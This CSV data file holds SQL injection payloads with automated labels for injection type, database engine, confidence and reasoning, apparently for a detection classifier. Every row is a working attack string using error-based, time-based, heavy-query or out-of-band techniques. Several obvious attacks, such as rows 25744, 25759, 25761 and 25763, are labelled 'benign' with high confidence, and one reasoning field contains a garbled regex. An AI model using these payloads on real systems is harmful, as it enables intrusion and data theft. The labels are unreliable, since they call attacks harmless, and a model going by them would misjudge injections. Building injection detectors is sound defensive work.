id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25744,-4104%' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25745,"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'bacm' = 'bacm",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25746,select ( case when ( 8618 = 8706 ) then 8618 else 8618* ( select 8618 from mysql.db ) end ) #,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25747,"-2605"" ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""cikb"" like ""cikb",out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
25748,1 ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25749,"1'qhfy<'"">utwq",unknown,generic,0.50,Insufficient information to classify,1
25750,1 ) where 1120 = 1120,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25751,"1"" ) order by 1#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25752,"1%' or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25753,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( ""dskh"" = ""dskh",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25754,"1%"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""%"" = """,error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25755,"1"" ) ) as wooq where 7671 = 7671 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25756,1 ) ) as wwkw where 7289 = 7289 and 7533 = 7533--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25757,"1' or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25758,"1"" where 4450 = 4450 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25759,"1%' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25760,1' where 5778 = 5778,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25761,-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25762,"-1874"" ) as wgpj where 6481 = 6481 or 3629 = 3459",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25763,"1' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'lwrk' like 'lwrk",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
